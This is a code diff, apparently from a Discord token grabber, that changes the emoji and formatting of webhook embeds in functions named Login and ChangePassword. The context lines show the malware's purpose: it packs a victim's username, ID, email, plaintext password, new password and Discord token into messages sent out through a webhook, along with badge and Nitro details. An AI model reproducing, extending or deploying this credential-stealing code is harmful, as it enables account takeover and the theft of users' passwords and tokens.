@@ -89,15 +89,15 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "❌ no nitro"
+		return "❌ \`no nitro\`"
 	}
 	if (flags == 1) {
-		return "✔️ nitro classic"
+		return "✔️ \`nitro classic\`"
 	}
 	if (flags == 2) {
-		return "✔️ nitro boost"
+		return "✔️ \`nitro boost\`"
 	} else {
-		return "❌ no nitro"
+		return "❌ \`no nitro\`"
 	}
 }
 
@@ -111,28 +111,28 @@ function GetRBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "✔️ discord staff "
+		badges += "✔️ \`discord staff\` "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "✔️ partnered server owner "
+		badges += "✔️ \`partnered server owner\` "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "✔️ hypesquad events "
+		badges += "✔️ \`hypesquad events\` "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "✔️ bug hunter tier 1 "
+		badges += "✔️ \`bug hunter tier 1\` "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "✔️ early supporter "
+		badges += "✔️ \`early supporter\` "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "✔️ bug hunter tier 2 "
+		badges += "✔️ \`bug hunter tier 2\` "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "✔️ verified bot developer "
+		badges += "✔️ \`verified bot developer\` "
 	}
 	if (badges == "") {
-		badges = "❌ no badges"
+		badges = "❌ \`no badges\`"
 	}
 	return badges
 }
@@ -150,28 +150,28 @@ function GetBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "✔️ discord staff "
+		badges += "✔️ \`discord staff\` "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "✔️ partnered server owner "
+		badges += "✔️ \`partnered server owner\` "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "✔️ hypesquad events "
+		badges += "✔️ \`hypesquad events\` "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "✔️ bug hunter tier 1 "
+		badges += "✔️ \`bug hunter tier 1\` "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "✔️ early supporter "
+		badges += "✔️ \`early supporter\` "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "✔️ bug hunter tier 2 "
+		badges += "✔️ \`bug hunter tier 2\` "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "✔️ verified bot developer "
+		badges += "✔️ \`verified bot developer\` "
 	}
 	if (badges == "") {
-		badges = "❌ no badges"
+		badges = "❌ \`no badges\`"
 	}
 	return badges
 }
@@ -197,12 +197,12 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "name",
-			    "value": `🏷️ \`` + json.username + `#` + json.discriminator + `\``,
+			    "value": `🗞️ \`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
                         {
                             "name": "id",
-                            "value": `🔖 \`` + json.id + `\``,
+                            "value": `🗞️ \`` + json.id + `\``,
                             "inline": true
                         },
                         {
@@ -217,7 +217,7 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "password",
-                            "value": `🔑 \`${password}\``,
+                            "value": `🔖 \`${password}\``,
                             "inline": true		    
                         },
                         {
@@ -242,7 +242,7 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": "token",
-                            "value": `\`${token}\``,
+                            "value": `🔑 \`${token}\``,
                             "inline": false
                         }
                     ],
@@ -284,12 +284,12 @@ function ChangePassword(email, newpassword, token) {
                     "fields": [
                         {
                             "name": "name",
-			    "value": `🏷️ \`` + json.username + `#` + json.discriminator + `\``,
+			    "value": `🗞️ \`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
                         {
                             "name": "id",
-                            "value": `🔖 \`` + json.id + `\``,
+                            "value": `🗞️ \`` + json.id + `\``,
                             "inline": true
                         },
                         {
@@ -304,7 +304,7 @@ function ChangePassword(email, newpassword, token) {
                         },
                         {
                             "name": "new password",
-                            "value": `🔑 \`${newpassword}\``,
+                            "value": `🔖 \`${newpassword}\``,
                             "inline": true		    
                         },
                         {
@@ -314,12 +314,12 @@ function ChangePassword(email, newpassword, token) {
                         }, 
                         {
                             "name": "badges",
-                            "value": `\`${GetBadges(json.flags)}\``,
+                            "value": `${GetBadges(json.flags)}`,
                             "inline": true		    
                         },
                         {
                             "name": "nitro",
-                            "value": `\`${GetNitro(json.premium_type)}\``,
+                            "value": `${GetNitro(json.premium_type)}`,
                             "inline": true		    
                         },
                         {
@@ -329,7 +329,7 @@ function ChangePassword(email, newpassword, token) {
                         }, 
                         {
                             "name": "token",
-                            "value": `\`${token}\``,
+                            "value": `🔑 \`${token}\``,
                             "inline": false
                         }
                     ],
